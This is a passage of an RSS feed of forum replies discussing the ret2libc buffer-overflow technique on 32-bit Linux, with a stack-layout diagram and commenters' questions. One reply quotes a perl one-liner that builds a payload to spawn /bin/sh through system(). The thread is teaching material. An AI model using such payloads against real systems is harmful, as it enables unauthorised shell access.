        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/15</link>
        <pubDate>Mon, 11 Dec 2017 10:31:37 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-15</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[direnjie]]></dc:creator>
        <description><![CDATA[
            <p>good article,thanks share</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/14</link>
        <pubDate>Mon, 11 Dec 2017 05:24:19 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-14</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Hi mate, PoC | GTFO <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Translation just in case: Show us your exploit and the given binary.</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/13</link>
        <pubDate>Sun, 10 Dec 2017 06:31:03 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-13</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[WhiteCollar]]></dc:creator>
        <description><![CDATA[
            <p>I was following this example with the latest version of debian just out of interest. I have made sure that program returns into system() and the stack frame for system is:</p>
<p>[address of exit()]  -&gt; Ret address<br>
[address of buffer] -&gt; Argument</p>
<p>but I am not getting a shell instead the program is just printing out “/bin/sh” on the console. Any tips?</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/12</link>
        <pubDate>Sun, 10 Dec 2017 03:04:34 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-12</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Much better explanation <a class="mention" href="https://0x00sec.org/u/_py">@_py</a>, thank you. You clear up things a lot.</p>
<p><a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> you should quote py’s response in your post.</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/11</link>
        <pubDate>Sun, 02 Apr 2017 19:58:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-11</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            <p>Yes I fixed it, should be 260 a’s  <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=9" title=":sweat_smile:" class="emoji" alt=":sweat_smile:"></p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/10</link>
        <pubDate>Sun, 02 Apr 2017 12:50:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-10</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Here’s the basic idea (keep in mind this will work on 32-bit binaries):</p>
<pre><code class="lang-makefile">                           Stack
                  +----------------------+
                  |       "/bin/sh"      |
                  +----------------------+
                  |   ret_after_system   |
                  +----------------------+
                  |     system_addr      |   &lt;-- ret
                  +----------------------+
                  |         ....         |
                  |         ....         |
                  | "AAAAAAAAAAAAAAAAAA" |
                  |         ....         |
                  |         ....         |
                  +----------------------+
                  
</code></pre>
<p>It’s the same as a buffer/stack overflow but with a twist. Since you can’t return to the stack because it’s not executable, you have to return somewhere else. Libc in that case could be pretty handy.</p>
<p><a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> wanted to call system(). So all he had to do is “simulate” the function calling convention behaviour and jump to system()'s code. Because the binary is 32-bit the function prologue in our case would be the following:</p>
<ul>
<li>Push the return address on the stack.</li>
<li>Push the function’s arguments.</li>
<li>Jump to system()'s code.</li>
</ul>
<p>When we have a case of a classic stack overflow, you overflow the stack and overwrite the pushed return address with the one of your shellcode’s. Once gets() is done it’ll jump to wherever the pushed return address is pointing to. But, there is no shellcode this time, there is system(). And in order to call system() you have to follow the above convention in order to look legit.</p>
<p>By the way, now that I look at <a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a>’s perl command, I think the order should be different(?). I might be wrong though.</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/9</link>
        <pubDate>Sun, 02 Apr 2017 10:34:52 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-9</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>I put off reading this initially, because i wanted to read it with a clear mind and time set aside for it. Since this concept is fairly tough to understand.</p>
<p>I don’t fully understand what’s going on, though,</p>
<aside class="quote no-group quote-modified" data-username="IoTh1nkN0t" data-post="1" data-topic="1833">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/ioth1nkn0t/40/3912_2.png" class="avatar"> IoTh1nkN0t:</div>
<blockquote>
<p>perl -e ‘print “/bin/sh\x00” . “a” x 252 . “\xe0\x03\xe5\xf7” . “aaaa” . “\x28\xd3\xff\xff”’ &gt; hakz</p>
</blockquote>
</aside>
<p>So you’re printing your parameters, a buffer, the address of libc? Another buffer and then the address of system?</p>
<p>Why is it in this order?</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/8</link>
        <pubDate>Sun, 02 Apr 2017 09:04:16 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-8</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
      <item>
        <title>Exploiting Techniques \000 - ret2libc</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Your write-up was pretty solid overall. I just felt that at some parts you assumed certain details to be known from the reader’s side and it might confuse them.</p>
<p>Just to be clear, I’m not saying your post is unclear. Just suggesting that in case your target audience isn’t only peeps who are familiar with pwning, you could add 1-2 snippets to trigger their curiosity about this whole “magic”.</p>
          <p><a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833/7</link>
        <pubDate>Mon, 27 Mar 2017 17:45:02 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1833-7</guid>
        <source url="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833.rss">Exploiting Techniques \000 - ret2libc</source>
      </item>
  </channel>
</rss>
